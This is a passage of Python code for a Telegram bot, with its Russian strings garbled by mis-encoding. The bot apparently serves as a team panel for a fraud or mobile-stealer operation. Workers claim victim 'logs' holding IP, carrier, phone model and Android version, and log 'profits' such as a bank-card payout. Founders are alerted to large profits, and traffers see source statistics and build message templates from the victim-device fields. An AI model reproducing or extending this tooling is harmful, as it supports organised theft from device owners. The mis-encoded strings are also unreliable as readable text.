            PENDING_PROFIT[c.from_user.id] = uuid
            await c.message.edit_text("üí∞ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø—Ä–æ—Ñ–∏—Ç–∞ (–∏ –æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ –∑–∞–º–µ—Ç–∫—É) –æ–¥–Ω–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º.\n–ü—Ä–∏–º–µ—Ä: <code>2500 –∫–∞—Ä—Ç–∞ —Ç–∏–Ω—å–∫</code>",
                                      parse_mode="HTML", reply_markup=kb_vb(c.from_user.id, has_active=True))
            await c.answer(); return
    await c.answer("–∞–∫—Ç–∏–≤–Ω–æ–≥–æ –ª–æ–≥–∞ –Ω–µ—Ç", show_alert=True)

# –∑–∞—Ö–≤–∞—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è –≤–≤–æ–¥–∞ —Å—É–º–º—ã –ø—Ä–æ—Ñ–∏—Ç–∞
@router.message(F.text)
async def capture_profit(m: Message):
    uid = m.from_user.id
    if uid in PENDING_PROFIT:
        uuid = PENDING_PROFIT.pop(uid)
        parts = m.text.strip().split(maxsplit=1)
        try:
            amount = float(parts[0].replace(",", "."))
        except Exception:
            await m.answer("—Å—É–º–º–∞ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞"); return
        note = parts[1] if len(parts) > 1 else ""
        v = LOGS.get(uuid)
        if not v or v.get("assigned_to") != uid:
            await m.answer("–ª–æ–≥ —É–∂–µ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω"); return
        v["profit"] = amount
        v["profit_note"] = note
        v["profited_at"] = datetime.now(timezone.utc).isoformat()
        await m.answer(f"‚úÖ –ø—Ä–æ—Ñ–∏—Ç {amount:.0f} —Å–æ—Ö—Ä–∞–Ω—ë–Ω –¥–ª—è {uuid}")
        if amount >= BIG_PROFIT:
            for fid in FOUNDER_IDS:
                with contextlib.suppress(Exception):
                    await m.bot.send_message(fid, f"üí• –ö—Ä—É–ø–Ω—ã–π –ø—Ä–æ—Ñ–∏—Ç: <b>{amount:.0f}</b>\nUUID: <code>{uuid}</code>",
                                             parse_mode="HTML")

# --- Traff panel
@router_cb(F.data == "work:tr")
async def cb_tr(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True); return
    await c.message.edit_text("üì¨ –¢—Ä–∞—Ñ—Ñ-–ø–∞–Ω–µ–ª—å", reply_markup=kb_tr(c.from_user.id))
    await c.answer()

@router_cb(F.data == "tr:denied")
async def cb_tr_denied(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True); return
    items = []
    for uuid, v in LOGS.items():
        if v.get("quarantined"):
            tid = v.get("trafer_id")
            if tid and tid != c.from_user.id and c.from_user.id not in FOUNDER_IDS:
                continue
            items.append(f"‚Ä¢ <code>{uuid}</code> ‚Äî {v.get('operator') or '-'}")
    if not items:
        await c.message.edit_text("üö´ –û—à–∏–±–æ—á–Ω—ã—Ö –ª–æ–≥–æ–≤ –Ω–µ—Ç", reply_markup=kb_tr(c.from_user.id), parse_mode="HTML")
    else:
        await c.message.edit_text("üö´ <b>–õ–æ–≥–∏ —Å –æ—à–∏–±–∫–æ–π –¥–æ—Å—Ç—É–ø–∞</b>\n" + "\n".join(items),
                                  reply_markup=kb_tr(c.from_user.id), parse_mode="HTML")
    await c.answer()

@router_cb(F.data == "tr:inbox")
async def cb_tr_inbox(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True); return
    await c.message.edit_text("‚úâÔ∏è –í—Ö–æ–¥—è—â–∏–µ: (–∑–∞–≥–ª—É—à–∫–∞)\n–°–∫–æ—Ä–æ —Ç—É—Ç –±—É–¥–µ—Ç —Å–ø–∏—Å–æ–∫ –Ω–æ–≤—ã—Ö –ª–æ–≥–æ–≤.",
                              reply_markup=kb_tr(c.from_user.id))
    await c.answer()

@router_cb(F.data == "tr:sources")
async def cb_tr_sources(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True); return
    stats = compute_stats(c.from_user.id, "30d")
    await c.message.edit_text("üìà –ò—Å—Ç–æ—á–Ω–∏–∫–∏ (30d):\n" + ("\n".join(stats["top_src_lines"]) or "‚Äî"),
                              reply_markup=kb_tr(c.from_user.id))
    await c.answer()

@router_cb(F.data == "tr:stats")
async def cb_tr_stats_root(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True); return
    await c.message.edit_text("–í—ã–±–µ—Ä–∏—Ç–µ –ø–µ—Ä–∏–æ–¥:", reply_markup=kb_tr_stats(c.from_user.id))
    await c.answer()

@router_cb(F.data.startswith("tr:stats:"))
async def cb_tr_stats(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True); return
    period = c.data.split(":")[2]
    s = compute_stats(c.from_user.id, period)
    await c.message.edit_text(render_stats(s), parse_mode="HTML", reply_markup=kb_tr_stats(c.from_user.id))
    await c.answer()

@router_cb(F.data == "tr:faq")
async def cb_tr_faq(c: CallbackQuery):
    await c.message.edit_text("üìö –ì–∞–π–¥/FAQ: (–∑–∞–≥–ª—É—à–∫–∞)\n–ö–æ—Ä–æ—Ç–∫–∏–µ –ø–æ–¥—Å–∫–∞–∑–∫–∏ –ø–æ –∏—Å—Ç–æ—á–Ω–∏–∫–∞–º –∏ –∫–∞—á–µ—Å—Ç–≤—É —Ç—Ä–∞—Ñ–∏–∫–∞.",
                              reply_markup=kb_tr(c.from_user.id))
    await c.answer()

# --- Builder
@router_cb(F.data == "tr:builder")
async def cb_tr_builder(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True); return
    await c.message.edit_text("üß± –ë–∏–ª–¥–µ—Ä —à–∞–±–ª–æ–Ω–æ–≤", reply_markup=kb_builder(c.from_user.id))
    await c.answer()

@router_cb(F.data == "builder:new")
async def cb_builder_new(c: CallbackQuery):
    BUILDER_STATE[c.from_user.id] = {"mode": "name", "buffer": {}}
    txt = ("üß± –ù–æ–≤—ã–π —à–∞–±–ª–æ–Ω\n"
           "–û—Ç–ø—Ä–∞–≤—å <b>–Ω–∞–∑–≤–∞–Ω–∏–µ</b> —à–∞–±–ª–æ–Ω–∞ –æ–¥–Ω–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º.\n"
           "–î–æ—Å—Ç—É–ø–Ω—ã–µ –ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä—ã –≤ —Ç–µ–∫—Å—Ç–µ:\n"
           "<code>{uuid} {operator} {ip} {model} {android} {worker}</code>")
    await c.message.edit_text(txt, parse_mode="HTML")
    await c.answer()

@router_cb(F.data.startswith("builder:view:"))
async def cb_builder_view(c: CallbackQuery):
    idx = int(c.data.split(":")[2])
    tpls = TEMPLATES[c.from_user.id]
    if idx < 0 or idx >= len(tpls):
        await c.answer("–Ω–µ –Ω–∞–π–¥–µ–Ω–æ", show_alert=True); return
    t = tpls[idx]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üóë –£–¥–∞–ª–∏—Ç—å", callback_data=f"builder:del:{idx}")],
        [InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="tr:builder")],
    ])
    await c.message.edit_text(f"üìÑ <b>{t['name']}</b>\n\n<code>{t['text']}</code>",
                              parse_mode="HTML", reply_markup=kb)
    await c.answer()

@router_cb(F.data.startswith("builder:del:"))
async def cb_builder_del(c: CallbackQuery):
    idx = int(c.data.split(":")[2])
    tpls = TEMPLATES[c.from_user.id]
    if 0 <= idx < len(tpls):
        t = tpls.pop(idx)
        await c.message.edit_text(f"üóë –£–¥–∞–ª—ë–Ω: <b>{t['name']}</b>", parse_mode="HTML",
                                  reply_markup=kb_builder(c.from_user.id))
    else:
        await c.answer("–Ω–µ –Ω–∞–π–¥–µ–Ω–æ", show_alert=True)
    await c.answer()

# –∑–∞—Ö–≤–∞—Ç —Ç–µ–∫—Å—Ç–æ–≤ –¥–ª—è –±–∏–ª–¥–µ—Ä-–º–∞—Å—Ç–µ—Ä–∞
@router.message(F.text)
async def builder_capture(m: Message):
    st = BUILDER_STATE.get(m.from_user.id)
    if not st:
        return  # –¥—Ä—É–≥–∏–µ —Ç–µ–∫—Å—Ç–æ–≤—ã–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –≤—ã—à–µ —É–∂–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞—é—Ç /profit –∏ —Ç.–ø.
    if st["mode"] == "name":
        st["buffer"]["name"] = m.text.strip()[:64]
        st["mode"] = "text"
        await m.answer("–û—Ç–ø—Ä–∞–≤—å <b>—Ç–µ–∫—Å—Ç —à–∞–±–ª–æ–Ω–∞</b>. –ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä—ã:\n"
                       "<code>{uuid} {operator} {ip} {model} {android} {worker}</code>",
                       parse_mode="HTML")
        return
    if st["mode"] == "text":
        text = m.text
        name = st["buffer"]["name"]
        TEMPLATES[m.from_user.id].insert(0, {"name": name, "text": text, "created_at": datetime.now(timezone.utc).isoformat()})
        BUILDER_STATE.pop(m.from_user.id, None)
        await m.answer(f"‚úÖ –®–∞–±–ª–æ–Ω ¬´{name}¬ª —Å–æ—Ö—Ä–∞–Ω—ë–Ω.\n–û—Ç–∫—Ä–æ–π ¬´üß± –ë–∏–ª–¥–µ—Ä¬ª —á—Ç–æ–±—ã –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å.", parse_mode="HTML")

# ---------- APP MAIN ----------
async def main():
    if not BOT_TOKEN:
        log.error("BOT_TOKEN –ø—É—Å—Ç")
        return

    bot = Bot(BOT_TOKEN)
    await setup_bot_commands(bot)

    dp = Dispatcher()
    dp.include_router(router)

    ws = WSClient(bot)
    dp["ws"] = ws

    ws_task = asyncio.create_task(ws.run())
    try:
        await dp.start_polling(bot, ws=ws)
    finally:
        ws_task.cancel()
        with contextlib.suppress(Exception):
            await ws_task

if __name__ == "__main__":
    asyncio.run(main())
